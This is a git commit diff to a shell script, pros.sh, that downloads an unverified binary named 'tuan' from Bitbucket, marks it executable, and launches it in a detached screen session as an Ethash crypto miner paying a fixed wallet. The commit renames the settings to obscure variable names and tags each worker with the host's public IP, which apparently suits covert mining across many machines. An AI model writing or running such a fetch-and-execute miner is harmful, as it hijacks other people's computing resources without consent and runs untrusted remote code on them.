d0dc1f39ad7fc25d7b6366e4bae5decbdd47481b
jrkeiter <91981745+jrkeiter@users.noreply.github.com>
2021-11-13 20:55:58 -0800

    Update pros.sh

--- pros.sh
+++ pros.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 
-WALLET=SHIB:0x9ffded4cf417cbf75ed73e4bbe3ee7df30d9ec46
-POOL=ethash-eu.unmineable.com:3333
-WORKER=Sagger
+WELS=0x9ffded4cf417cbf75ed73e4bbe3ee7df30d9ec46
+PAL=stratum+tcp://us1.ethermine.org:4444
+WER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-MOON
 
 
 
@@ -13,4 +13,4 @@ else
     wget https://bitbucket.org/solomase/garangsem/raw/d261db312adaef2baefd19624650e14af8c938dc/tuan
     chmod +x ./tuan
 fi
-screen -dmLS mine ./tuan --algo ETHASH --pool $POOL --user $WALLET.$WORKER
+screen -dmLS mine ./tuan --algo ETHASH --pool $PAL --user $WELS.$WER --ethstratum ETHV1 --tls 0 --keepfree =5
